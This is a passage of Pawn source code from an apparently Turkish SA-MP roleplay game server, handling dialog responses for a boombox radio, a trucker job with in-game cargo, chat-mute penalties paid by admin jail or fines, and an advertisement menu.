                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Rock", stringg, "Oynat", "Iptal");
			}
			if(listitem == 21)
			{
				for(new r = 210; r < 220; ++r)
			    {
    				format(name, sizeof(name), "%s", VehicleRadioListing[r][radioname]);
					format(stringg, sizeof(stringg), "%s %s\n", stringg, name);
					ListItemTrackId[playerid][iCount++] = r;
			    }
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_PLAY, DIALOG_STYLE_LIST, "Boombox Sohbet", stringg, "Oynat", "Iptal");
			}
			// CURRENTLY NO HOLIDAYS
			/*if(listitem == 24)
			{
                ShowPlayerDialogEx(playerid, DIALOG_BOOMBOX_SEASON, DIALOG_STYLE_LIST, "Boombox Seasonal/Holiday", "", "Oynat", "Iptal");
			}*/
		}
	}
	if(dialogid == DIALOG_BOOMBOX_PLAY)
	{
		if(response)
		{
			new t = ListItemTrackId[playerid][listitem];

			format(string, sizeof(string), "* %s, boombox kanalýný %s olarak deðiþtirdi.", GetPlayerNameEx(playerid), VehicleRadioListing[t][radioname]);
			ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			BoomBoxSet[playerid] = 1;

        	GetPlayerPos(playerid, BoomboxInfo[playerid][bbPosX], BoomboxInfo[playerid][bbPosY], BoomboxInfo[playerid][bbPosZ]);
        	BoomboxInfo[playerid][bbInt] = GetPlayerInterior(playerid);
        	BoomboxInfo[playerid][bbVW] = GetPlayerVirtualWorld(playerid);
			BoomboxInfo[playerid][bbStation] = t+1;
			BoomboxInfo[playerid][bbSetBy] = playerid;

			ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
			ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
			BoomboxInfo[playerid][bbObject] = CreateDynamicObject(2103, BoomboxInfo[playerid][bbPosX], BoomboxInfo[playerid][bbPosY], BoomboxInfo[playerid][bbPosZ]-0.9, 0, 0, 0, BoomboxInfo[playerid][bbVW], BoomboxInfo[playerid][bbInt]);

       		foreach(Player, i)
			{
				if(IsPlayerInRangeOfPoint(i,150.0,BoomboxInfo[playerid][bbPosX],BoomboxInfo[playerid][bbPosY],BoomboxInfo[playerid][bbPosZ]) && GetPlayerInterior(i) == BoomboxInfo[playerid][bbInt] && GetPlayerVirtualWorld(i) == BoomboxInfo[playerid][bbVW])
				{
					PlayAudioStreamForPlayer(i, VehicleRadioListing[t][radiourl], BoomboxInfo[playerid][bbPosX], BoomboxInfo[playerid][bbPosY], BoomboxInfo[playerid][bbPosZ], 50.0, 1);
				}
			}
		}
	}
	/*if(dialogid == REPORTSMENU)
	{
	    if(response)
	    {
	        if(CancelReport[playerid] == listitem) return 1;
			new reportid = ListItemReportId[playerid][listitem];
	        if(Reports[reportid][BeingUsed] == 0)
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Rapor ID'si kullanýlmýyor!");
			    return 1;
			}
			if(!IsPlayerConnected(Reports[reportid][ReportFrom]))
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Rapor eden oyundan çýktý!");
			    Reports[reportid][ReportFrom] = 999;
			    Reports[reportid][BeingUsed] = 0;
			    return 1;
			}
			format(string, sizeof(string), "AdminKomutu: %s has accepted the report from %s (ID: %i RID: %i).", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]), Reports[reportid][ReportFrom], reportid);
			ABroadCast(COLOR_ORANGE, string, 1);
			AddReportToken(playerid); // Report Tokens
			if(PlayerInfo[playerid][pAdmin] == 1)
			{
			    SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, "An admin has accepted your report and is reviewing it, you can /cevap to send messages to the admin reviewing your report.");
			}
			else
			{
			    format(string, sizeof(string), "%s has accepted your report and is reviewing it, you can /cevap to send messages to the admin reviewing your report.", GetPlayerNameEx(playerid));
			    SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
			}
			PlayerInfo[playerid][pAcceptReport]++;
			Reports[reportid][ReplyTimerr] = SetTimerEx("ReplyTimer", 60000, 0, "d", reportid);
			Reports[reportid][CheckingReport] = playerid;
			//Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			Reports[reportid][TimeToExpire] = 0;
			//strmid(Reports[reportid][Report], "Yok", 0, 4, 4);
	    }
	    else
	    {
	        if(CancelReport[playerid] == listitem) return 1;
	        new reportid = ListItemReportId[playerid][listitem];
	        if(Reports[reportid][BeingUsed] == 0)
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Rapor ID'si kullanýlmýyor!");
			    return 1;
			}
			if(!IsPlayerConnected(Reports[reportid][ReportFrom]))
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Rapor eden oyundan çýktý!");
			    Reports[reportid][ReportFrom] = 999;
			    Reports[reportid][BeingUsed] = 0;
			    return 1;
			}
			format(string, sizeof(string), "AdminKomutu: %s has trashed the report from %s (RID: %i).", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]), reportid);
			ABroadCast(COLOR_ORANGE, string, 1);
			if(PlayerInfo[playerid][pAdmin] == 1)
			{
			    SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, "An admin has marked your report invalid. It will not be reviewed.");
			}
			else
			{
			    format(string, sizeof(string), "%s has marked your report invalid. It will not be reviewed.", GetPlayerNameEx(playerid));
			    SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
			}
			PlayerInfo[playerid][pTrashReport]++;
			Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			Reports[reportid][TimeToExpire] = 0;
			new reportdialog[2048], itemid = 0;
		    for(new i = 0; i < MAX_REPORTS; i++)
			{
				if(Reports[i][BeingUsed] == 1 && itemid < 40)
				{
					ListItemReportId[playerid][itemid] = i;
					itemid++;
					if(strlen((Reports[i][Report])) > 92)
					{
						new firstline[128], secondline[128];
						strmid(firstline, Reports[i][Report], 0, 88);
						strmid(secondline, Reports[i][Report], 88, 128);
						format(reportdialog, sizeof(reportdialog), "%s%s(ID:%i) | Report: %s", reportdialog, GetPlayerNameEx(Reports[i][ReportFrom]), Reports[i][ReportFrom], i, firstline);
						format(reportdialog, sizeof(reportdialog), "%s%s", reportdialog, secondline);
						ListItemReportId[playerid][itemid] = i;
						itemid++;
					}
					else format(reportdialog, sizeof(reportdialog), "%s%s(ID:%i) | Report: %s", reportdialog, GetPlayerNameEx(Reports[i][ReportFrom]), Reports[i][ReportFrom], i, (Reports[i][Report]));

					format(reportdialog, sizeof(reportdialog), "%s\n", reportdialog);
				}
			}
			CancelReport[playerid] = itemid;
			format(reportdialog, sizeof(reportdialog), "%s\n", reportdialog);
			format(reportdialog, sizeof(reportdialog), "%sCancel Reports", reportdialog);
			//SendClientMessage(playerid, COLOR_GREEN, "___________________________________________________");
			ShowPlayerDialogEx(playerid, REPORTSMENU, DIALOG_STYLE_LIST, "Reports", reportdialog, "Accept", "Trash");
			//strmid(Reports[reportid][Report], "Yok", 0, 4, 4);
	    }
	}*/
	if(dialogid == DIALOG_LOADTRUCK) // TRUCKER JOB LOAD TRUCK
	{
 		if(response)
		{
			if(listitem == 0) // Legal goods
			{

			    ShowPlayerDialogEx(playerid, DIALOG_LOADTRUCKL, DIALOG_STYLE_LIST, "Ne taþýmak istiyorsun?","{00F70C}Yiyecek & Ýçecek\n{00F70C}Kýyafet\n{00F70C}Materyal\n{00F70C}Market Malzemeleri", "Seç", "Iptal");
			}
			if(listitem == 1) // Illegal goods
			{
				new level = PlayerInfo[playerid][pTruckSkill];
				if(level >= 0 && level < 50)
				{
            		ShowPlayerDialogEx(playerid, DIALOG_LOADTRUCKI, DIALOG_STYLE_LIST, "Ne taþýmak istiyorsun?","{FF0606}Silahlar 		{FFFFFF}(Level 1 Bonus: Yok)\n{FF0606}Ýlaçlar 			{FFFFFF}(Level 1 Bonus: Yok)\n{FF0606}Illegal materyaller  	{FFFFFF}(Level 1 Bonus: Bedava 25 materyal)", "Seç", "Iptal");
				}
				else if(level >= 50 && level < 100)
				{
		    		ShowPlayerDialogEx(playerid, DIALOG_LOADTRUCKI, DIALOG_STYLE_LIST, "Ne taþýmak istiyorsun?","{FF0606}Silahlar 		{FFFFFF}(Level 2 Bonus: Susturuculu tabanca yada 9mm)\n{FF0606}Ýlaçlar 			{FFFFFF}(Level 2 Bonus: 1gr pot yada 1gr crack)\n{FF0606}Illegal materyaller  	{FFFFFF}(Level 2 Bonus: Bedava 50 materyal)", "Seç", "Iptal");
				}
				else if(level >= 100 && level < 200)
				{
		    		ShowPlayerDialogEx(playerid, DIALOG_LOADTRUCKI, DIALOG_STYLE_LIST, "Ne taþýmak istiyorsun?","{FF0606}Silahlar 		{FFFFFF}(Level 3 Bonus: Susturuculu tabanca, 9mm yada Shotgun)\n{FF0606}Ýlaçlar 			{FFFFFF}(Level 3 Bonus: 1gr pot ve 1gr crack)\n{FF0606}Illegal materyaller  	{FFFFFF}(Level 3 Bonus: Bedava 100 materyal)", "Seç", "Iptal");
				}
				else if(level >= 200 && level < 400)
				{
            		ShowPlayerDialogEx(playerid, DIALOG_LOADTRUCKI, DIALOG_STYLE_LIST, "Ne taþýmak istiyorsun?","{FF0606}Silahlar 		{FFFFFF}(Level 4 Bonus: Susturuculu tabanca, 9mm, Shotgun yada Rifle)\n{FF0606}Ýlaçlar 			{FFFFFF}(Level 4 Bonus: 2gr pot ve 2gr crack)\n{FF0606}Illegal materyaller  	{FFFFFF}(Level 4 Bonus: Bedava 150 materyal)", "Seç", "Iptal");
				}
				else if(level >= 400)
				{
 		 			ShowPlayerDialogEx(playerid, DIALOG_LOADTRUCKI, DIALOG_STYLE_LIST, "Ne taþýmak istiyorsun?","{FF0606}Silahlar 		{FFFFFF}(Level 5 Bonus: Shotgun, Rifle yada Deagle [nadir])\n{FF0606}Ýlaçlar 			{FFFFFF}(Level 5 Bonus: 3gr pot ve 3gr crack)\n{FF0606}Illegal materyaller  	{FFFFFF}(Level 5 Bonus: Bedava 200 materyal)", "Seç", "Iptal");
				}
			}
		}
		else
		{
		    DeletePVar(playerid, "IsFrozen");
			TogglePlayerControllable(playerid, 1);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Kamyona mal yüklemeyi iptal ettin. Yük yüklemek için /yukyukle yazip tekrar dene.");
		}
	}
	if(dialogid == DIALOG_LOADTRUCKL) // TRUCKER JOB LEGAL GOODS
	{
 		if(response)
		{
			if(listitem == 0) // Food & beverages
			{
				new route = Random(1, 4);
    			if(route == 1)
				{
    				SetPVarInt(playerid, "TruckDeliver", 1);
    			}
    			if(route == 2)
				{
    				SetPVarInt(playerid, "TruckDeliver", 2);
    			}
    			if(route == 3)
				{
    				SetPVarInt(playerid, "TruckDeliver", 3);
    			}
    			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Kamyona yiyecek & içecek yüklenirken lütfen bekle....");
			}
			if(listitem == 1) // Clothing
			{
				new route = Random(1, 4);
    			if(route == 1)
				{
    				SetPVarInt(playerid, "TruckDeliver", 4);
    			}
    			if(route == 2)
				{
    				SetPVarInt(playerid, "TruckDeliver", 5);
    			}
    			if(route == 3)
				{
    				SetPVarInt(playerid, "TruckDeliver", 6);
    			}
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Kamyona kýyafet yüklenirken lütfen bekle....");
			}
			if(listitem == 2) // Materials
			{
				SetPVarInt(playerid, "TruckDeliver", 7);
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Kamyona materyal yüklenirken lütfen bekle....");
			}
			if(listitem == 3) // 24/7 Items
			{
				new route = Random(1, 4);
    			if(route == 1)
				{
    				SetPVarInt(playerid, "TruckDeliver", 8);
    			}
    			if(route == 2)
				{
    				SetPVarInt(playerid, "TruckDeliver", 9);
    			}
    			if(route == 3)
				{
    				SetPVarInt(playerid, "TruckDeliver", 10);
    			}
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Kamyona market malzemeleri yüklenirken lütfen bekle....");
			}

  			LoadTruckBar[playerid] = CreateProgressBar(258.00, 137.00, 131.50, 3.19, COLOR_GREEN, 100.0);
			SetProgressBarValue(LoadTruckBar[playerid], 100.0);
			ShowProgressBarForPlayer(playerid, LoadTruckBar[playerid]);
			SetTimerEx("LoadTruck", 1000, 0, "d", playerid);
		}
		else
		{
		    DeletePVar(playerid, "IsFrozen");
			TogglePlayerControllable(playerid, 1);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Kamyona mal yüklemeyi iptal ettin. Yük yüklemek için /yukyukle yazip tekrar dene.");
		}
	}

	if(dialogid == DIALOG_LOADTRUCKI) // TRUCKER JOB ILLEGAL GOODS
	{
 		if(response)
		{
		    new level = PlayerInfo[playerid][pTruckSkill];
			if(listitem == 0) // Weapons
			{
				if(level >= 0 && level < 50)
				{
                    SetPVarInt(playerid, "TruckDeliver", 11); // bonus weapons
				}
				else if(level >= 50 && level < 100)
				{
                    SetPVarInt(playerid, "TruckDeliver", 12); // bonus weapons
				}
				else if(level >= 100 && level < 200)
				{
                    SetPVarInt(playerid, "TruckDeliver", 13); // bonus weapons
				}
				else if(level >= 200 && level < 400)
				{
                    SetPVarInt(playerid, "TruckDeliver", 14); // bonus weapons
				}
				else if(level >= 400)
				{
                    SetPVarInt(playerid, "TruckDeliver", 15); // bonus weapons
				}
    			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Kamyon silahlar ile yüklenirken lütfen bekle....");
			}
			if(listitem == 1) // Drugs
			{
				if(level >= 0 && level < 50)
				{
                    SetPVarInt(playerid, "TruckDeliver", 16); // bonus drugs
				}
				else if(level >= 50 && level < 100)
				{
                    SetPVarInt(playerid, "TruckDeliver", 17); // bonus drugs
				}
				else if(level >= 100 && level < 200)
				{
                    SetPVarInt(playerid, "TruckDeliver", 18); // bonus drugs
				}
				else if(level >= 200 && level < 400)
				{
                    SetPVarInt(playerid, "TruckDeliver", 19); // bonus drugs
				}
				else if(level >= 400)
				{
                    SetPVarInt(playerid, "TruckDeliver", 20); // bonus drugs
				}
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Kamyon ilaçlar ile yüklenirken lütfen bekle...");
			}
			if(listitem == 2) // Illegal materials
			{
				if(level >= 0 && level < 50)
				{
                    SetPVarInt(playerid, "TruckDeliver", 21); // Bonus: x materials
				}
				else if(level >= 50 && level < 100)
				{
                    SetPVarInt(playerid, "TruckDeliver", 22); // Bonus: x materials
				}
				else if(level >= 100 && level < 200)
				{
                    SetPVarInt(playerid, "TruckDeliver", 23); // Bonus: x materials
				}
				else if(level >= 200 && level < 400)
				{
                    SetPVarInt(playerid, "TruckDeliver", 24); // Bonus: x materials
				}
				else if(level >= 400)
				{
                    SetPVarInt(playerid, "TruckDeliver", 25); // Bonus: x materials
				}
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Kamyon illegal materyallerle yüklenirken lütfen bekle.");
			}

  			LoadTruckBar[playerid] = CreateProgressBar(258.00, 137.00, 131.50, 3.19, COLOR_GREEN, 100.0);
			SetProgressBarValue(LoadTruckBar[playerid], 100.0);
			ShowProgressBarForPlayer(playerid, LoadTruckBar[playerid]);
			SetTimerEx("LoadTruck", 1000, 0, "d", playerid);
		}
		else
		{
		    DeletePVar(playerid, "IsFrozen");
			TogglePlayerControllable(playerid, 1);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Kamyona mal yüklemeyi iptal ettin. Yük yüklemek için /yukyukle yazip tekrar dene.");
		}
	}
	if(dialogid == NMUTE)
	{
	    if(response == 1)
	    {
	        switch(listitem)
	        {
	            case 0: // Jailtime
				{
				    if(PlayerInfo[playerid][pNMuteTotal] < 4)
				    {
				        /*if(GetPVarInt(playerid, "PBM") > 0)
					    {
					        LeavePaintballArena(playerid, GetPVarInt(playerid, "IsInArena"));
					    }*/
					    PlayerInfo[playerid][pNMute] = 0;
				        ResetPlayerWeaponsEx(playerid);
						if(PlayerInfo[playerid][pJailed] != 0)
						{
						    PlayerInfo[playerid][pJailTime] += PlayerInfo[playerid][pNMuteTotal]*15*60;
						}
						else
						{
							if(PlayerDraggedBy[playerid] != INVALID_PLAYER_ID) {
								IsCopDragging[PlayerDraggedBy[playerid]] = INVALID_PLAYER_ID;
								PlayerDragged[playerid] = 0;
								PlayerDraggedBy[playerid] = INVALID_PLAYER_ID;
							}
							PlayerInfo[playerid][pJailed] = 3;
							PlayerInfo[playerid][pJailTime] = PlayerInfo[playerid][pNMuteTotal]*15*60;
							PhoneOnline[playerid] = 1;
		    				LoadObjectsForPlayer(playerid);

							if(IsPlayerAttachedObjectSlotUsed(playerid, 0))
								RemovePlayerAttachedObject(playerid, 0);

							SetPlayerInterior(playerid, 69);
							PlayerInfo[playerid][pVW] = 696969;
							PlayerInfo[playerid][pInt] = 69;
							SetPlayerVirtualWorld(playerid, 696969);
							new rand = random(sizeof(AdminPrisonFloat));
							SetPlayerPos(playerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);
						}
				    }
				    else if(PlayerInfo[playerid][pNMuteTotal] >= 4 || PlayerInfo[playerid][pNMuteTotal] < 7)
				    {
				        /*if(GetPVarInt(playerid, "PBM") > 0)
					    {
					        LeavePaintballArena(playerid, GetPVarInt(playerid, "IsInArena"));
					    }*/
					    PlayerInfo[playerid][pNMute] = 0;
						GameTextForPlayer(playerid, "~w~Admin Hapsine ~n~~r~Hosgeldin", 5000, 3);
						ResetPlayerWeaponsEx(playerid);
                        if(PlayerInfo[playerid][pJailed] != 0)
                        {
                            PlayerInfo[playerid][pJailTime] += PlayerInfo[playerid][pNMuteTotal]*15*60;
                        }
                        else
                        {
							if(PlayerDraggedBy[playerid] != INVALID_PLAYER_ID) {
								IsCopDragging[PlayerDraggedBy[playerid]] = INVALID_PLAYER_ID;
								PlayerDragged[playerid] = 0;
								PlayerDraggedBy[playerid] = INVALID_PLAYER_ID;
							}
							PlayerInfo[playerid][pJailed] = 3;
							PlayerInfo[playerid][pJailTime] = PlayerInfo[playerid][pNMuteTotal]*15*60;
							PhoneOnline[playerid] = 1;
		    				LoadObjectsForPlayer(playerid);

							if(IsPlayerAttachedObjectSlotUsed(playerid, 0))
								RemovePlayerAttachedObject(playerid, 0);

							SetPlayerInterior(playerid, 69);
							PlayerInfo[playerid][pVW] = 696969;
							PlayerInfo[playerid][pInt] = 69;
							SetPlayerVirtualWorld(playerid, 696969);
							new rand = random(sizeof(AdminPrisonFloat));
							SetPlayerPos(playerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);
						}
				    }
					format(string,sizeof(string),"{AA3333}AdminUyarýsý{FFFF00}: %s, newbie kanalýndaki mutesini açtýrmak için %d dakika hapiste.",GetPlayerNameEx(playerid),PlayerInfo[playerid][pNMuteTotal]*15);
					ABroadCast(COLOR_YELLOW,string,1);
	            }
	            case 1: // Fine
	            {
	                new playername[MAX_PLAYER_NAME];
	                GetPlayerName(playerid, playername, sizeof(playername));

					new allmoney;
					if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
					{
						allmoney = HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney]+GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
					}
					else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner], true) == 0)
					{
						allmoney += HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney];
					}
					else
					{
						allmoney = GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
					}

				    new fine = 10*allmoney/100;
	                format(string,sizeof(string),"{AA3333}AdminUyarýsý{FFFF00}: %s, newbie kanalýndaki mutesini açtýrmak için $%d ceza ödedi.",GetPlayerNameEx(playerid),fine);
	                GivePlayerCash(playerid,-fine);
					ABroadCast(COLOR_YELLOW,string,1);
					PlayerInfo[playerid][pNMute] = 0;
	            }
	        }
	    }
		else
		{
		    format(string,sizeof(string),"{AA3333}AdminUyarýsý{FFFF00}: %s, newbie kanalý mutesinden dolayý aldýðý cezayý iptal etti.",GetPlayerNameEx(playerid));
			ABroadCast(COLOR_YELLOW,string,1);
		}
	}
	if(dialogid == ADMUTE)
	{
	    if(response == 1)
	    {
	        switch(listitem)
	        {
	            case 0: // Jailtime
				{
				    if(PlayerInfo[playerid][pADMuteTotal] < 4)
				    {
				        /*if(GetPVarInt(playerid, "PBM") > 0)
					    {
					        LeavePaintballArena(playerid, GetPVarInt(playerid, "IsInArena"));
					    }*/
					    PlayerInfo[playerid][pADMute] = 0;
				        ResetPlayerWeaponsEx(playerid);
						if(PlayerInfo[playerid][pJailed] != 0)
						{
						    PlayerInfo[playerid][pJailTime] += PlayerInfo[playerid][pADMuteTotal]*15*60;
						}
						else
						{
							PlayerInfo[playerid][pJailed] = 3;
							PlayerInfo[playerid][pJailTime] = PlayerInfo[playerid][pNMuteTotal]*15*60;
							if(PlayerDraggedBy[playerid] != INVALID_PLAYER_ID) {
								IsCopDragging[PlayerDraggedBy[playerid]] = INVALID_PLAYER_ID;
								PlayerDragged[playerid] = 0;
								PlayerDraggedBy[playerid] = INVALID_PLAYER_ID;
							}
							PhoneOnline[playerid] = 1;
		    				LoadObjectsForPlayer(playerid);

							if(IsPlayerAttachedObjectSlotUsed(playerid, 0))
								RemovePlayerAttachedObject(playerid, 0);

							SetPlayerInterior(playerid, 69);
							PlayerInfo[playerid][pVW] = 696969;
							PlayerInfo[playerid][pInt] = 69;
							SetPlayerVirtualWorld(playerid, 696969);
							new rand = random(sizeof(AdminPrisonFloat));
							SetPlayerPos(playerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);
						}
				    }
				    else if(PlayerInfo[playerid][pADMuteTotal] >= 4 || PlayerInfo[playerid][pADMuteTotal] < 7)
				    {
				        /*if(GetPVarInt(playerid, "PBM") > 0)
					    {
					        LeavePaintballArena(playerid, GetPVarInt(playerid, "IsInArena"));
					    }*/
					    PlayerInfo[playerid][pADMute] = 0;
						GameTextForPlayer(playerid, "~w~Admin Hapsine ~n~~r~Hosgeldin", 5000, 3);
						ResetPlayerWeaponsEx(playerid);
						if(PlayerInfo[playerid][pJailed] != 0)
						{
						    PlayerInfo[playerid][pJailTime] += PlayerInfo[playerid][pADMuteTotal]*15*60;
						}
						else
						{
							if(PlayerDraggedBy[playerid] != INVALID_PLAYER_ID) {
								IsCopDragging[PlayerDraggedBy[playerid]] = INVALID_PLAYER_ID;
								PlayerDragged[playerid] = 0;
								PlayerDraggedBy[playerid] = INVALID_PLAYER_ID;
							}
							PlayerInfo[playerid][pJailed] = 3;
							PlayerInfo[playerid][pJailTime] = PlayerInfo[playerid][pNMuteTotal]*15*60;
							PhoneOnline[playerid] = 1;
		    				LoadObjectsForPlayer(playerid);

							if(IsPlayerAttachedObjectSlotUsed(playerid, 0))
								RemovePlayerAttachedObject(playerid, 0);

							SetPlayerInterior(playerid, 69);
							PlayerInfo[playerid][pVW] = 696969;
							PlayerInfo[playerid][pInt] = 69;
							SetPlayerVirtualWorld(playerid, 696969);
							new rand = random(sizeof(AdminPrisonFloat));
							SetPlayerPos(playerid, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);
						}
				    }
					format(string,sizeof(string),"{AA3333}AdminUyarýsý{FFFF00}: %s, reklam mutesini açtýrmak için %d dakika hapiste.",GetPlayerNameEx(playerid),PlayerInfo[playerid][pADMuteTotal]*15);
					ABroadCast(COLOR_YELLOW,string,1);
	            }
	            case 1: // Fine
	            {
	                new playername[MAX_PLAYER_NAME];
	                GetPlayerName(playerid, playername, sizeof(playername));

					new allmoney;
					if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
					{
						allmoney = HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney]+GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
					}
					else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner], true) == 0)
					{
						allmoney += HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney];
					}
					else
					{
						allmoney = GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
					}

                    PlayerInfo[playerid][pADMute] = 0;
				    new fine = 10*allmoney/100;
	                format(string,sizeof(string),"{AA3333}AdminUyarýsý{FFFF00}: %s, reklam mutesinin kaldýrýlmasý için $%d ödedi.",GetPlayerNameEx(playerid),fine);
	                GivePlayerCash(playerid,-fine);
					ABroadCast(COLOR_YELLOW,string,1);
	            }
	        }
	    }
	    else
	    {
	        format(string,sizeof(string),"{AA3333}AdminUyarýsý{FFFF00}: %s, reklam mutesi için aldýðý cezayý iptal etti.",GetPlayerNameEx(playerid));
			ABroadCast(COLOR_YELLOW,string,1);
	    }
	}
	switch(dialogid) {
		case DIALOG_ADMAIN: if(response) switch(listitem) {
			case 0: {

				new
					szDialog[2256],
					szBuffer[32],
					arrAdverts[MAX_PLAYERS] = INVALID_PLAYER_ID,
					iDialogCount,
					iCount,
					iBreak,
					iRand;

				for(new x; x < 50; ++x) ListItemTrackId[playerid][x] = -1;
				foreach(Player, i) if(!isnull(szAdvert[i])) arrAdverts[iCount++] = i;

				while(iDialogCount < 50 && iBreak < 5000) {
					iRand = random(iCount);
					if(arrAdverts[iRand] != INVALID_PLAYER_ID) {
						strcpy(szBuffer, szAdvert[arrAdverts[iRand]], sizeof(szBuffer));
						if(AdminDuty[playerid] == 0) format(szDialog, sizeof(szDialog), "%s%s... (%i)\r\n", szDialog, szBuffer, PlayerInfo[arrAdverts[iRand]][pNumber]);
						else format(szDialog, sizeof(szDialog), "%s%s... (%s)\r\n", szDialog, szBuffer, GetPlayerNameEx(arrAdverts[iRand]));
						ListItemTrackId[playerid][iDialogCount++] = arrAdverts[iRand];
						arrAdverts[iRand] = INVALID_PLAYER_ID;
					}
					++iBreak;
				}
				if(!isnull(szDialog)) return ShowPlayerDialogEx(playerid, DIALOG_ADLIST, DIALOG_STYLE_LIST, "Reklamlar - Liste", szDialog, "Seç", "Geri Don");
				ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Reklamlar", "Reklamlarý Listele\nReklam Ara\nReklam ver\nÖncelikli Reklam Ver", "Seç", "Iptal");
				SendClientMessage(playerid, COLOR_GREY, "Yollanan reklam yok.");
			}
			case 1: ShowPlayerDialogEx(playerid, DIALOG_ADSEARCH, DIALOG_STYLE_INPUT, "Reklamlar - Ara", "Enter a search phrase.", "Ara", "Geri Don");
			case 2: {
				if(PlayerInfo[playerid][pADMute] == 1) {
					SendClientMessage(playerid, COLOR_GREY, "Reklam verme mutesi yemiþsin.");
				}
				else if(PlayerInfo[playerid][pNumber] == 0) {
					SendClientMessage(playerid, COLOR_GRAD2, "Telefonun yok.");
				}
				else ShowPlayerDialogEx(playerid, DIALOG_ADPLACE, DIALOG_STYLE_INPUT, "Advertisements - Place Advertisement", "Enter your desired advertisement text! Keep it below 128 characters.", "Submit", "Geri Don");
			}
			case 3: {
				if(PlayerInfo[playerid][pADMute] == 1) {
					SendClientMessage(playerid, COLOR_GREY, "Reklam verme mutesi yemiþsin.");
				}
				else if(PlayerInfo[playerid][pNumber] == 0) {
					SendClientMessage(playerid, COLOR_GRAD2, "Telefonun yok.");
				}
				else if(iAdverTimer >= 1) {
					ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Reklamlar", "Reklamlarý Listele\nReklam Ara\nReklam ver\nÖncelikli Reklam Ver", "Seç", "Iptal");
					return SendClientMessage(playerid, COLOR_GREY, "Her 30 saniyede yalnýzca bir tane öncelikli reklam verilebilir.");
				}
				else if(GetPVarType(playerid, "adT")) {
					ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Reklamlar", "Reklamlarý Listele\nReklam Ara\nReklam ver\nÖncelikli Reklam Ver", "Seç", "Iptal");
					return SendClientMessage(playerid, COLOR_GREY, "Yalnýzca 2 dakikada bir öncelikli reklam verebilirsin.");
				}
				else ShowPlayerDialogEx(playerid, DIALOG_ADPLACEP, DIALOG_STYLE_INPUT, "Reklamlar - Öncelikli Reklam",
				"Ýstediðin öncelikli reklam içeriðini gir! 128 karakterin üzerine çýkamazsýn.\nÖncelikli bir reklam olacaðý için, tüm oyuncular görebilecek ve bu sana 800$'a patlayacak.", "Submit", "Geri Don");
			}
		}
		case DIALOG_ADPLACE: {
			if(response) {

				new
					iLength = strlen(inputtext);

				if(!(2 <= iLength <= 127)) {
					ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Reklamlar", "Reklamlarý Listele\nReklam Ara\nReklam ver\nÖncelikli Reklam Ver", "Seç", "Iptal");
					return SendClientMessage(playerid, COLOR_GREY, "Girdiðiniz içerik çok uzun yada çok kýsa.");
				}

				iLength *= 5;
				if(GetPlayerCash(playerid) < iLength) {
					ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Reklamlar", "Reklamlarý Listele\nReklam Ara\nReklam ver\nÖncelikli Reklam Ver", "Seç", "Iptal");
					return SendClientMessage(playerid, COLOR_GREY, "Bunun için yeterli paran yok.");
				}
